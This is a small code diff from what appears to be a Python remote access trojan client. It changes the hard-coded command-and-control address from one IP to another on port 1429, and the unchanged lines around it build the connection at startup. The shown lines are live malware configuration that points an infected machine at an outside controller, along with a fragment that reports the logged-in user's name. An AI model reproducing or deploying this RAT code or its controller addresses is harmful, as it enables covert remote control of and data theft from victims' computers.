@@ -619,7 +619,7 @@ User: {os.getlogin()}
                 s.send(b"exit")
                 break
             
-rat = RAT_CLIENT('91.109.184.16', 1429)
+rat = RAT_CLIENT('91.109.182.6', 1429)
 
 if __name__ == '__main__':
     rat.build_connection()
